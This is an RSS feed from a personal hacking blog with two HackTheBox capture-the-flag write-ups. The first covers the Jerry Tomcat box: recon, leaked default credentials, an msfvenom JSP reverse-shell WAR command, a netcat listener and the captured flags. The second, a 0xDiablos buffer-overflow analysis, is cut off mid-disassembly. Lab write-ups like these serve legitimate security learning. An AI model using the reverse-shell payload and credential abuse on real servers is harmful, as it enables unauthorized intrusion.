<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Cecil Daemon&apos;s Wish</title>
    <description>Personal hacker&apos;s blog</description>
    <link>http://localhost:4000</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <author>
      <name>J. Alex Buschinelli</name>
      <email>buschinellijoao@gmail.com</email>
      <uri>https://ashishchaudhary.in/hacker-blog</uri>
    </author>
    
      <item>
        <title>Jerry - HackTheBox</title>
        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;

&lt;p&gt;This going to be our last write-up of the year. In that manner, we are going to be tackling the Jerry box in &lt;a href=&quot;https://app.hackthebox.com&quot;&gt;HackTheBox&lt;/a&gt;. From the machine picture, it seems to be a Windows machine. Let’s get started!&lt;/p&gt;

&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;

&lt;p&gt;We can take a look at the machine description. Let’s take a look:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Description&lt;/p&gt;

  &lt;p&gt;Although Jerry is one of the easier machines on Hack The Box, it is realistic as Apache Tomcat is often found exposed and configured with common or weak credentials.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Ok! So the machine given to us is running Apacha Tomcat with weak credentials.&lt;/p&gt;

&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;

&lt;p&gt;As always, let’s keep our mindset:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Understanding basic concepts&lt;/li&gt;
  &lt;li&gt;Understanding the problem&lt;/li&gt;
  &lt;li&gt;Crafting an attack&lt;/li&gt;
  &lt;li&gt;Solving&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;However, it is worth noting that for an actual realistic penetration testing, we might adjust some of our steps. We shall call the first step “Recon”, since it is where we are going to be performing our reconnaissance.&lt;/p&gt;

&lt;h2 id=&quot;step-1---reconnaissance&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt;Step 1 - Reconnaissance&lt;/h2&gt;

&lt;p&gt;Similar to understanding basic concepts, the recon part aims to help us gather information on our target by analyzing what we have on our disposal. For a black box pentest, this is the position we are right now. We first need intel on our target: which ports are open? can we investigate every service available? is there a web service (though this is already answered by the CTF description).&lt;/p&gt;

&lt;p&gt;We shall start our recon with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;. I like to start my mapping the network with a simple &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;
Starting Nmap 7.94 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2023-12-31 12:29 UTC
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.95
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.16s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 999 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
PORT     STATE SERVICE
8080/tcp open  http-proxy

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;19.35 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, there is a webservice running on port 8080. Let’s run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; again, but now analyzing this port’s info. I’m also wondering if port 22 is open, but Windows’ firewall is blocking our pings. So, I ran:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 22,8080 &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;
Starting Nmap 7.94 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2023-12-31 12:31 UTC
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.95
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.29s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT     STATE    SERVICE VERSION
22/tcp   filtered ssh
8080/tcp open     http    Apache Tomcat/Coyote JSP engine 1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;19.72 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Alright. We got our Apache Tomcat right there. Port 22 seems to be filtered, which might indicate a firewall behind it. Let’s access the web service at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://$IP:8080&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/tomcat-jerry-1.png&quot; alt=&quot;tomcat homepage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It seems we are hacking someone who just installed Apache Tomcat version 7.0.88 on this machine. First thing that glances my eyes is the “Server Status” button. Let’s access it:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/tomcat-jerry-2.png&quot; alt=&quot;tomcat server status&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We get a bunch of nice information here. First, we can see that we are running on a Windows Server 2012 R2 on an amd64 architecture. We also can see that the hostname is “JERRY”. Since there is nothing much else here, we can continue our recon through the website manually. After some digging, we find the relative path &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/docs/appdev/deployment.html&lt;/code&gt;, which leads to:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/tomcat-jerry-3.png&quot; alt=&quot;tomcat deploy docs&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is interesting. It is telling us that to deploy an application in this version, we need to compress it into Web Archive (WAR) format.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;A web application is defined as a hierarchy of directories and files in a standard layout. Such a hierarchy can be accessed in its “unpacked” form, where each directory and file exists in the filesystem separately, or in a “packed” form known as a Web ARchive, or WAR file. The former format is more useful during development, while the latter is used when you distribute your application to be installed.&lt;/p&gt;

  &lt;p&gt;To facilitate creation of a Web Application Archive file in the required format, it is convenient to arrange the “executable” files of your web application (that is, the files that Tomcat actually uses when executing your app) in the same organization as required by the WAR format itself.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Since apps can be deployed, we somehow might be able to see which ones are running or have already deployed in this machine. While looking for it, I stumbled upon a login-style alert box, when trying to access the “Host manager”. Since I did not know any credentials, I simply clicked cancel on it, and then, as an error, the server lead me here:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/tomcat-jerry-5.png&quot; alt=&quot;tomcat credential leak&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So we have found a pair of credentials that might be the ones needed to access the “Host Manager”. The credentials are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tomcat:s3cret&lt;/code&gt;. Even though we have found them, trying to access the “Host manager” with them gives us a 403 response.&lt;/p&gt;

&lt;p&gt;Upon some more investigation, we find this relative path &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/manager/html/list&lt;/code&gt;, which leads to this page:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/tomcat-jerry-4.png&quot; alt=&quot;tomcat deploy list&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It seems we are able to upload an app directly to the server from the web service. If this is the case, then we might be able to get a reverse shell by deploying an app.&lt;/p&gt;

&lt;h2 id=&quot;step-2---understanding-the-problem&quot;&gt;&lt;a href=&quot;#mindset-step2&quot;&gt;&lt;/a&gt;Step 2 - Understanding the problem&lt;/h2&gt;

&lt;p&gt;Alright, it seems we have found our way in with our recon. Let’s take a look at what we have found so far:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Leaked credentials &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tomcat:s3cret&lt;/code&gt; in error pages.&lt;/li&gt;
  &lt;li&gt;Deployment app that accepts WAR files.&lt;/li&gt;
  &lt;li&gt;An upload functionality within the web service.&lt;/li&gt;
  &lt;li&gt;Unaccessible Host Manager page, giving 403.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Now, we might be able to think of an attack vector. We could investigate the unaccessible Host Manager page to see if we find more vectors. However, after some basic attempts, I’ve found nothing there. Which leads me to think our way in is through a reverse shell. If we manage to deploy a reverse shell app, we might be able to get foothold on the system.&lt;/p&gt;

&lt;h2 id=&quot;step-3---crafting-the-attack&quot;&gt;&lt;a href=&quot;#mindset-step3&quot;&gt;&lt;/a&gt;Step 3 - Crafting the attack&lt;/h2&gt;

&lt;p&gt;For that task, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt;. A simple Google Search “msfvenom war file” leads to &lt;a href=&quot;https://charlesreid1.com/wiki/MSFVenom&quot;&gt;this&lt;/a&gt; page. We can see that there is a specific payload for Tomcat. We can generate our payload with:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; java/jsp_shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;YOUR IP&amp;gt; &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1234 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; war &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell.war
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This will create a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell.war&lt;/code&gt; file that is going to be our revserse shell app. After that, we upload this shell into the web server:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/tomcat-jerry-6.png&quot; alt=&quot;tomcat deploy list&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If successful, we are going to see a “OK” message right on the top of the page, underneath “Tomcat Web Application Manager”. Now, we need to start listening on port 1234 (or the port chosen as a payload to msfvenom) on our local machine with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -lnvp 1234&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now, we simply access &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/shell/&lt;/code&gt;, or the name of the app WAR file (without .war), and we shall get access to the machine through netcat:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 1234
Connection from 10.10.10.95:49192
Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 6.3.9600]
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2013 Microsoft Corporation. All rights reserved.

C:&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pache-tomcat-7.0.88&amp;gt;whoami
&lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem

C:&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pache-tomcat-7.0.88&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We not only got access to the machine but also we are logged in as the Windows Administrator!&lt;/p&gt;

&lt;h2 id=&quot;step-4---solving&quot;&gt;&lt;a href=&quot;#mindset-step4&quot;&gt;&lt;/a&gt;Step 4 - Solving!&lt;/h2&gt;

&lt;p&gt;Now, we can just retrieve the flags. They are located at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Users\Administrator\Desktop\flags&lt;/code&gt; directory:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\f&lt;/span&gt;lags&amp;gt;dir
&lt;span class=&quot;nb&quot;&gt;dir
 &lt;/span&gt;Volume &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of c:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\f&lt;/span&gt;lags

06/19/2018  06:09 AM    &amp;lt;DIR&amp;gt;          &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
06/19/2018  06:09 AM    &amp;lt;DIR&amp;gt;          ..
06/19/2018  06:11 AM                88 2 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the price of 1.txt
               1 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;             88 bytes
               2 Dir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   2,418,737,152 bytes free
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can easily retrieve them with the command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\f&lt;/span&gt;lags&amp;gt;type &lt;span class=&quot;s2&quot;&gt;&quot;2 for the price of 1.txt&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;2 for the price of 1.txt&quot;&lt;/span&gt;
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;In this CTF, we adopted a different approach, starting with thorough reconnaissance, and then gaining a foothold in the system. We exploited an Apache Tomcat file upload vulnerability, which provided us with a reverse shell as a Windows Administrator.&lt;/p&gt;

&lt;p&gt;With a good recon, finding your way in became trivial in this CTF!&lt;/p&gt;

&lt;p&gt;I hope you liked this write-up, learned something new, and I wish you a happy 2024. As always, don’t forget to do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Sun, 31 Dec 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000//jerry-htb</link>
        <link href="http://localhost:4000/jerry-htb"/>
        <guid isPermaLink="true">http://localhost:4000/jerry-htb</guid>
      </item>
    
      <item>
        <title>You know 0xDiablos? - HackTheBox</title>
        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;

&lt;p&gt;In this write-up, we are going to be taking a closer look at the &lt;em&gt;You Know 0xDiablos&lt;/em&gt; challenge on &lt;a href=&quot;https://app.hackthebox.com&quot;&gt;HackTheBox&lt;/a&gt;. We can download the challenge files and test them in our own machine; but to solve it, we need to use netcat.&lt;/p&gt;

&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;

&lt;p&gt;The challenge description says:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Description&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;I missed my flag&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In order to better understand this, let’s use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; to connect to the machine:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc 167.99.82.136 31251
You know &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;are 0xDiablos: 
hi mom
hi mom
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This really looks like a buffer overflow problem. From what it looks like, we pass a stdin value and get it back. Let’s download the files and investigate this further.&lt;/p&gt;

&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;

&lt;p&gt;As always, let’s keep our mindset:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Understanding basic concepts&lt;/li&gt;
  &lt;li&gt;Understanding the problem&lt;/li&gt;
  &lt;li&gt;Crafting an attack&lt;/li&gt;
  &lt;li&gt;Solving&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;After downloading the file, we see that it has the name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln&lt;/code&gt; and we get:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ab7f19bb67c16ae453d4959fba4e6841d930a6dd, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 3.2.0, not stripped
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;showing us it is an ELF-32 executable. We might need to get our sleeves dirty using GDB in order to understand what is happening under the hoods.&lt;/p&gt;

&lt;h2 id=&quot;step-1---understanding-basic-concepts&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt;Step 1 - Understanding basic concepts&lt;/h2&gt;

&lt;p&gt;Alright, but what are an ELF-32 bit executable and GDB?&lt;/p&gt;

&lt;h3 id=&quot;elf-file&quot;&gt;ELF file&lt;/h3&gt;

&lt;p&gt;An ELF-32 bit LSB executable file can be broken down to:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;ELF:&lt;/strong&gt; Stands for Executable and Linkable Format. Put into simple terms, it is the Linux version of an .exe file. It’s a standard file format for executable files, shared libraries, and core dumps on Linux and other Unix-like operating systems.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;32bit&lt;/strong&gt;: This indicates the architecture for which the file is combiled. 32bit mean its use is for a 32bit architecture, in contrast of being for a 64bit.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;LSB&lt;/strong&gt;: Or Least Significant Bit, refers to the endianness of the file. LSB means that the least significant byte of a word is stored in the smallest address. This means it works with little-endian format.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The fact that this ELF is not stripped also tells us we can possibly debug it into assembly, or even C.&lt;/p&gt;

&lt;h2 id=&quot;gdb&quot;&gt;GDB&lt;/h2&gt;

&lt;p&gt;GDB (GNU Debugger) is a debugger, often used as a reverse engineering tool, that runs on many Unix-like systems and works with numerous programming languages. It essentially allows us to grasp the program’s code in an assembly-like format to understand its flow.&lt;/p&gt;

&lt;p&gt;Let’s see how we can use it. To start analyzing an executable, we run:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb ./&amp;lt;executable&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This will open up the GDB CLI in your terminal. When inside, we need to know some basic commands:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run/r&lt;/code&gt;: to run the program as it is.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;break/b *&amp;lt;address/function&amp;gt;&lt;/code&gt;: sets a breakpoint. GDB will pause the execution of the program when it reaches this point.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x/20x &amp;lt;register&amp;gt;&lt;/code&gt;: displays the content of memory at a given address.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;continue/c&lt;/code&gt;: continues execution flow of the program.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stepi&lt;/code&gt;: jumps to the next instruction in the stack.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disassemble&lt;/code&gt;: disassembles current function.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This will make more sense once we start analyzing the binary ELF file.&lt;/p&gt;

&lt;h2 id=&quot;step-2---understanding-the-problem&quot;&gt;&lt;a href=&quot;#mindset-step2&quot;&gt;&lt;/a&gt;Step 2 - Understanding the problem&lt;/h2&gt;

&lt;p&gt;First, let’s use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objdump&lt;/code&gt; to get the assembly instructions of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; vuln
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This will give a huge assembly dump. What it is most interesting here are the following functions &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln&lt;/code&gt; function is called from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; at this address:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
8049301:       83 ec 0c                sub    &lt;span class=&quot;nv&quot;&gt;$0xc&lt;/span&gt;,%esp
8049304:       8d 83 38 e0 ff ff         lea    &lt;span class=&quot;nt&quot;&gt;-0x1fc8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebx&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax
804930a:       50                      push   %eax
804930b:       e8 60 fd ff ff            call   8049070 &amp;lt;puts@plt&amp;gt;
8049310:       83 c4 10                add    &lt;span class=&quot;nv&quot;&gt;$0x10&lt;/span&gt;,%esp
8049313:       e8 5a ff ff ff             call   8049272 &amp;lt;vuln&amp;gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln&lt;/code&gt; is called, we get to the point where it asks for our stdin input:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
8049290:       50                      push   %eax
8049291:       e8 aa fd ff ff            call   8049040 &amp;lt;gets@plt&amp;gt;
8049296:       83 c4 10                add    &lt;span class=&quot;nv&quot;&gt;$0x10&lt;/span&gt;,%esp
8049299:       83 ec 0c                sub    &lt;span class=&quot;nv&quot;&gt;$0xc&lt;/span&gt;,%esp
804929c:       8d 85 48 ff ff ff          lea    &lt;span class=&quot;nt&quot;&gt;-0xb8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax
80492a2:       50                      push   %eax
80492a3:       e8 c8 fd ff ff            call   8049070 &amp;lt;puts@plt&amp;gt;
80492a8:       83 c4 10                add    &lt;span class=&quot;nv&quot;&gt;$0x10&lt;/span&gt;,%esp
80492ab:       90                      nop
80492ac:       8b 5d &lt;span class=&quot;nb&quot;&gt;fc                &lt;/span&gt;mov    &lt;span class=&quot;nt&quot;&gt;-0x4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%ebx
80492af:       c9                      leave
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Since there is nowhere in the instructions a call to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt; function, we might need to inject a call ourselves within the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets@plt&lt;/code&gt;, which is vulnerable to buffer overflow. We just need to know how much allocated memory is reserved to the buffer pointed by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%esp&lt;/code&gt;, which is our input. If succeeded, we can overflow the stack and overwrite the return address to call the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt; function.&lt;/p&gt;

&lt;p&gt;The interesting parts of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt; functions are:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
 8049205:       e8 a6 fe ff ff            call   80490b0 &amp;lt;fopen@plt&amp;gt;
 804920a:       83 c4 10                add    &lt;span class=&quot;nv&quot;&gt;$0x10&lt;/span&gt;,%esp
